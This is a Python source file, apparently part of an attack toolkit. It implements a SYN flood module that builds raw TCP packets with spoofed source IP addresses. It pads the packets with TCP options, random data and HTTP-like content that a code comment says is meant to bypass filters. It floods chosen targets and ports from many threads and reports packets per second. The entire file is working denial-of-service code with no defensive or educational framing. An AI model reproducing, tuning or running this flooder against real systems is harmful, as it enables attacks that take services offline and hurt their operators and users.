import random
import struct
import threading
import time
import os
import socket
import logging
from typing import List
from .utilities import UI, Style
from .methods import AttackModule

class SYNFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60, 
                 threads: int = 5, debug: bool = False, proxy_manager=None, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        
        # Initialize logger first
        self.logger = logging.getLogger(self.__class__.__name__)
        if debug:
            self.logger.setLevel(logging.DEBUG)
        else:
            self.logger.setLevel(logging.INFO)

        # Rest of initialization
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        
        # Calculate packet size based on thread count
        self.payload_size = self.calculate_packet_size(threads, base_size=1024)
        
        # SYN flood specific settings
        self.socket_count = max(4096, threads * 256)  # Scale socket count with threads
        self.send_rate = max(100000, threads * 20000)  # Scale send rate with threads
        
        # Performance settings - more aggressive
        self.burst_size = 8192       # Increased from 4096
        self.burst_delay = 0.00001   # Reduced delay for faster sending
        
        # IP and TCP header settings
        self.ip_id = random.randint(1000, 65535)
        self.tcp_seq = random.randint(1000, 65535)
        self.tcp_window = 65535  # Maximum window size
        
        # Source IP spoofing (only works with raw sockets)
        self.spoof_ip = True
        self.ip_range = [
            "192.168.0.0/16",
            "10.0.0.0/8",
            "172.16.0.0/12"
        ]
        
        # TCP options to increase packet size (only for raw sockets)
        self.use_tcp_options = True
        self.tcp_option_mss = 1460
        self.tcp_option_wscale = 7
        self.tcp_option_sackperm = True
        self.tcp_option_timestamp = True
        
        # Add payload to SYN packets to increase BPS
        self.add_payload = True
        
        # Socket buffer size increased
        self.socket_buffer = 1048576  # Increased to 1MB
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0
        }
        
        # Thread management
        self._monitor_thread = None
        self._stop_event = threading.Event()
        
        # Socket pools for better resource management
        self.socket_pools = []
        self.socket_pool_locks = []
        for _ in range(min(threads, 32)):  # Limit to 32 pools max
            self.socket_pools.append({})
            self.socket_pool_locks.append(threading.Lock())
        
        # Precomputed packet templates for better performance
        self.packet_templates = []
        
        if debug:
            self.logger.setLevel(logging.DEBUG)
    
    def calculate_packet_size(self, threads: int, base_size: int = 1024) -> int:
        """Calculate packet size based on thread count"""
        # Scale packet size with thread count, but cap it at 65000
        scaled_size = base_size * (1 + (threads // 2))
        return min(scaled_size, 65000)

    def _check_raw_socket_capability(self):
        """Check if we can create raw sockets (requires root/admin)"""
        try:
            # Try to create a raw socket
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                self.use_raw_socket = True
                return True
        except (socket.error, PermissionError):
            self.use_raw_socket = False
            return False
    
    def _generate_random_ip(self):
        """Generate a random IP address for spoofing"""
        # More sophisticated implementation that respects CIDR ranges
        cidr = random.choice(self.ip_range)
        network, bits = cidr.split('/')
        bits = int(bits)
        
        # Convert network address to integer
        network_int = 0
        for i, octet in enumerate(reversed(network.split('.'))):
            network_int += int(octet) * (256 ** i)
        
        # Calculate the number of hosts in this network
        host_bits = 32 - bits
        host_count = 2 ** host_bits - 2  # Subtract network and broadcast addresses
        
        if host_count <= 0:
            # Fallback for single-host networks
            return network
        
        # Generate a random host in this network
        random_host = random.randint(1, host_count)
        ip_int = network_int + random_host
        
        # Convert back to dotted decimal
        octets = []
        for i in range(4):
            octets.insert(0, str(ip_int % 256))
            ip_int //= 256
        
        return '.'.join(octets)
    
    def _calculate_checksum(self, msg):
        """Calculate the TCP/IP checksum"""
        s = 0
        for i in range(0, len(msg), 2):
            if i + 1 < len(msg):
                w = (msg[i] << 8) + msg[i + 1]
            else:
                w = msg[i] << 8
            s = s + w
        
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        
        # Complement and mask to 2 bytes
        s = ~s & 0xffff
        
        return s
    
    def _create_tcp_options(self):
        """Create TCP options to increase packet size"""
        options = b''
        
        # MSS option (kind=2, len=4, value=1460)
        if self.tcp_option_mss:
            options += struct.pack('!BBH', 2, 4, self.tcp_option_mss)
        
        # Window scale option (kind=3, len=3, value=7)
        if self.tcp_option_wscale:
            options += struct.pack('!BBB', 3, 3, self.tcp_option_wscale)
        
        # SACK permitted option (kind=4, len=2)
        if self.tcp_option_sackperm:
            options += struct.pack('!BB', 4, 2)
        
        # Timestamp option (kind=8, len=10, value=timestamp, echo=0)
        if self.tcp_option_timestamp:
            options += struct.pack('!BBLLB', 8, 10, int(time.time()), 0, 0)
        
        # Add padding if needed to make options a multiple of 4 bytes
        if len(options) % 4 != 0:
            padding_len = 4 - (len(options) % 4)
            options += b'\x00' * padding_len
        
        return options
    
    def _create_syn_packet(self, src_ip, dst_ip, dst_port):
        """Create a TCP SYN packet with maximum payload"""
        # Generate TCP options
        tcp_options = self._create_tcp_options() if self.use_tcp_options else b''
        tcp_options_len = len(tcp_options) // 4  # Length in 32-bit words
        
        # Generate larger payload
        payload = b''
        if self.add_payload:
            # Create a larger random payload
            payload = os.urandom(self.payload_size)
            
            # Add HTTP-like content to bypass some filters
            http_payload = (
                b"GET / HTTP/1.1\r\n"
                b"Host: " + dst_ip.encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"Accept: */*\r\n"
                b"\r\n"
            )
            payload = http_payload + payload
        
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20 + len(tcp_options) + len(payload)  # IP + TCP + options + payload
        ip_id = self.ip_id
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        # TCP Header
        tcp_source = random.randint(1024, 65535)  # Random source port
        tcp_dest = dst_port
        tcp_seq = self.tcp_seq
        tcp_ack_seq = 0
        tcp_doff = 5 + tcp_options_len  # 5 words (20 bytes) + options
        
        # TCP Flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = self.tcp_window
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        # TCP header without options and checksum
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source,
            tcp_dest,
            tcp_seq,
            tcp_ack_seq,
            tcp_offset_res,
            tcp_flags,
            tcp_window,
            tcp_check,
            tcp_urg_ptr
        )
        
        # Combine TCP header with options
        tcp_header_with_options = tcp_header + tcp_options
        
        # Pseudo header for TCP checksum calculation
        source_address = socket.inet_aton(src_ip)
        dest_address = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header_with_options) + len(payload)
        
        psh = struct.pack('!4s4sBBH',
            source_address,
            dest_address,
            placeholder,
            protocol,
            tcp_length
        )
        
        psh = psh + tcp_header_with_options + payload
        
        tcp_check = self._calculate_checksum(psh)
        
        # Make the TCP header again with the correct checksum
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source,
            tcp_dest,
            tcp_seq,
            tcp_ack_seq,
            tcp_offset_res,
            tcp_flags,
            tcp_window,
            tcp_check,
            tcp_urg_ptr
        )
        
        # Final packet
        packet = ip_header + tcp_header + tcp_options + payload
        
        # Calculate IP header checksum
        ip_check = self._calculate_checksum(packet[:20])
        
        # Rebuild IP header with correct checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        # Final packet with correct IP checksum
        packet = ip_header + tcp_header + tcp_options + payload
        
        return packet
    
    def _precompute_packet_templates(self, target, port):
        """Precompute packet templates for better performance"""
        templates = []
        
        # Generate 10 different packet templates
        for _ in range(10):
            src_ip = self._generate_random_ip()
            packet = self._create_syn_packet(src_ip, target, port)
            templates.append(packet)
        
        return templates
    
    def _send_syn_raw(self, target, port, sock, packet_templates=None):
        """Send SYN packet using raw socket with IP spoofing"""
        try:
            # Use precomputed template if available, otherwise generate new packet
            if packet_templates and random.random() < 0.8:  # 80% chance to use template
                packet = random.choice(packet_templates)
            else:
                # Generate a random source IP for spoofing
                src_ip = self._generate_random_ip()
                packet = self._create_syn_packet(src_ip, target, port)
            
            # Send the packet
            sock.sendto(packet, (target, 0))
            
            # Update stats
            self.increment_stat("packets_sent")
            self.increment_stat("bytes_sent", len(packet))
            self.increment_stat("successful")
            
            return True
        except Exception as e:
            if self.debug:
                self.logger.debug(f"Raw socket send error: {e}")
            self.increment_stat("failures")
            return False
    
    def _send_syn_normal(self, target, port, sock):
        """Send SYN packet using normal socket with larger payload"""
        try:
            sock.settimeout(0.001)  # Reduced timeout further
            
            # Try to connect
            sock.connect((target, port))
            
            # If connection established, send large payload
            try:
                data_size = random.randint(32768, 65000)  # Increased payload size
                payload = os.urandom(data_size)
                sock.send(payload)
                
                # Update stats with actual data sent
                self.increment_stat("bytes_sent", data_size + 40)
            except:
                self.increment_stat("bytes_sent", 40)
            
            self.increment_stat("packets_sent")
            self.increment_stat("successful")
            
            return True
        except (socket.timeout, ConnectionRefusedError):
            # Count as successful for SYN flood
            self.increment_stat("packets_sent")
            self.increment_stat("bytes_sent", 1024)  # Increased minimum bytes count
            self.increment_stat("successful")
            return True
        except Exception as e:
            if self.debug:
                self.logger.debug(f"Normal socket send error: {e}")
            self.increment_stat("failures")
            return False
    
    def _get_socket_from_pool(self, target, port, pool_index=0):
        """Get or create a socket from the specified pool"""
        key = f"{target}:{port}"
        
        with self.socket_pool_locks[pool_index % len(self.socket_pool_locks)]:
            pool = self.socket_pools[pool_index % len(self.socket_pools)]
            
            if key not in pool:
                try:
                    # Create a new socket
                    if self.use_raw_socket:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)  # Increased to 512KB
                        sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)  # Added TCP_NODELAY
                        sock.setblocking(False)
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)
                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        sock.setblocking(0)
                    
                    pool[key] = sock
                except Exception as e:
                    if self.debug:
                        self.logger.debug(f"Socket creation error: {e}")
                    return None
            
            return pool[key]
    
    def flood_target(self, target, port, thread_id=0):
        """Worker function for SYN flooding with enhanced performance"""
        self.logger.debug(f"Starting SYN flood worker {thread_id} for {target}:{port}")
        
        # Socket management
        raw_sock = None
        sockets = []
        packet_templates = None
        
        # Check if we can use raw sockets
        if self.use_raw_socket:
            # Create a raw socket
            try:
                raw_sock = self._get_socket_from_pool(target, port, thread_id)
                if not raw_sock:
                    raise Exception("Failed to get raw socket from pool")
                
                # Precompute packet templates for this worker
                packet_templates = self._precompute_packet_templates(target, port)
                
                self.logger.debug(f"Worker {thread_id} using raw socket for SYN flooding")
            except Exception as e:
                self.logger.warning(f"Worker {thread_id} failed to create raw socket: {e}")
                self.use_raw_socket = False
        
        # If raw socket failed or not available, use normal sockets
        if not self.use_raw_socket:
            # Create socket pool for this worker
            for i in range(self.socket_count):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setblocking(0)  # Non-blocking
                    sockets.append(s)
                except Exception as e:
                    if self.debug:
                        self.logger.debug(f"Socket creation error: {e}")
        
        # Main attack loop
        last_update = time.time()
        packets_sent = 0
        socket_index = 0
        
        try:
            while self.running and not self._stop_event.is_set():
                # Send packets in bursts for better performance
                burst_start = time.time()
                packets_in_burst = 0
                
                for _ in range(self.burst_size):
                    if not self.running or self._stop_event.is_set():
                        break
                    
                    if self.use_raw_socket and raw_sock:
                        # Send using raw socket with IP spoofing
                        success = self._send_syn_raw(target, port, raw_sock, packet_templates)
                    else:
                        # Rotate through normal sockets
                        if not sockets:
                            break
                        
                        # Get next socket
                        s = sockets[socket_index]
                        socket_index = (socket_index + 1) % len(sockets)
                        
                        # Send using normal socket
                        success = self._send_syn_normal(target, port, s)
                        
                        # Replace socket if it was used
                        try:
                            s.close()
                            sockets[socket_index] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sockets[socket_index].setblocking(0)
                        except:
                            pass
                    
                    if success:
                        packets_sent += 1
                        packets_in_burst += 1
                    
                    # Check if we should stop after each packet
                    if not self.running or self._stop_event.is_set():
                        break
                
                # Check if we should stop after the burst
                if not self.running or self._stop_event.is_set():
                    break
                
                # Control send rate with adaptive timing
                burst_duration = time.time() - burst_start
                if burst_duration < self.burst_delay:
                    time.sleep(self.burst_delay)  # Single short sleep instead of intervals
                
                # Increment sequence numbers for variety
                self.tcp_seq = (self.tcp_seq + packets_in_burst) % 65535
                self.ip_id = (self.ip_id + packets_in_burst) % 65535
                
        except Exception as e:
            if self.debug:
                self.logger.error(f"Error in SYN flood worker {thread_id}: {e}")
        finally:
            # Cleanup resources
            if self.use_raw_socket and raw_sock:
                try:
                    raw_sock.close()
                except:
                    pass
            
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
    
    def monitor_performance(self):
        """Monitor and display performance metrics"""
        last_update = time.time()
        last_stats = self.stats
        
        while self.running and not self._stop_event.is_set():
            try:
                time.sleep(0.1)  # More frequent updates for responsiveness
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats
                    
                    # Calculate rates
                    pps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    # Update peak metrics
                    if pps > self.perf_data["highest_pps"]:
                        self.perf_data["highest_pps"] = pps
                    if mbps > self.perf_data["highest_mbps"]:
                        self.perf_data["highest_mbps"] = mbps
                    
                    # Update current metrics
                    self.perf_data["current_pps"] = pps
                    self.perf_data["current_mbps"] = mbps
                    
                    # Calculate success rate
                    total_attempts = current_stats["successful"] + current_stats["failures"]
                    success_rate = int((current_stats["successful"] / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    # Format status line
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_line = f"[{timestamp}] | Target: {self.targets[0]} | Port: {self.ports[0]} | Method: SYNFLOODER | PPS: {pps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
                    
                    # Print status
                    print(status_line)
                    
                    # Update tracking values
                    last_stats = current_stats
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)
    
    def _print_final_stats(self):
        """Print final statistics"""
        elapsed = time.time() - self.start_time
        pps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        mbps = (self.stats["bytes_sent"] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total SYN packets sent: {self.stats['packets_sent']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Failed packets: {self.stats['failures']:,}")
        print(f"- Average speed: {pps:.0f} packets/sec ({mbps:.2f} Mbps)")
        print(f"- Peak performance: {self.perf_data['highest_pps']:.0f} packets/sec ({self.perf_data['highest_mbps']:.2f} Mbps)")
    
    def start(self):
        """Start the SYN flood operation"""
        super().start()
        
        UI.print_header("SYN Flood Operation")
        UI.print_info(f"Starting SYN flood against {len(self.targets)} targets on {len(self.ports)} ports")
        
        # Reset stop event
        self._stop_event.clear()
        
        # Check for raw socket capability
        has_raw = self._check_raw_socket_capability()
        if has_raw:
            UI.print_success("Running with raw socket capability - IP spoofing enabled")
            if self.add_payload:
                UI.print_info(f"Adding {self.payload_size/1024:.1f}KB payload to each SYN packet for higher BPS")
            if self.use_tcp_options:
                UI.print_info("Using TCP options to increase packet size")
        else:
            UI.print_warning("Running without raw socket capability - IP spoofing disabled")
            UI.print_info("For full SYN flood capabilities, run with root/administrator privileges")
        
        # Show configuration
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Threads per target/port: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Using {'raw' if self.use_raw_socket else 'normal'} sockets")
        print(f"- Burst size: {self.burst_size} packets")
        print(f"- Target send rate: {self.send_rate * self.threads * len(self.targets) * len(self.ports)} packets/sec")
        
        # Start worker threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for t in range(self.threads):
                    thread = threading.Thread(
                        target=self.flood_target, 
                        args=(target, port, thread_count)
                    )
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                           prefix=f"Threads: {thread_count}/{total_threads}",
                                           length=30)
        
        # Start performance monitoring
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = True
        self._monitor_thread.start()
        
        # Run for specified duration
        try:
            UI.print_info(f"Operation running for {self.duration} seconds (Press Ctrl+C to stop)")
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            # Ensure we stop properly
            self.stop()
    
    def stop(self):
        """Stop the SYN flood operation gracefully and quickly"""
        if not self.running:
            return
            
        UI.print_info("Stopping SYN flood operation...")
        
        # Set the stop event to signal all threads to stop
        self._stop_event.set()
        
        # Set running flag to false
        self.running = False
        
        # Stop the monitor thread first
        if self._monitor_thread and self._monitor_thread.is_alive():
            try:
                self._monitor_thread.join(timeout=1)
            except Exception as e:
                if self.debug:
                    self.logger.debug(f"Error stopping monitor thread: {e}")
        
        # Stop all worker threads with a short timeout
        for thread in self.thread_list:
            try:
                thread.join(timeout=0.5)  # Short timeout for quick termination
            except Exception as e:
                if self.debug:
                    self.logger.debug(f"Error stopping thread: {e}")
        
        # Clean up socket pools
        for pool in self.socket_pools:
            for key, sock in pool.items():
                try:
                    sock.close()
                except:
                    pass
            pool.clear()
        
        # Print final stats
        self._print_final_stats()
        
        UI.print_success("SYN flood operation stopped successfully")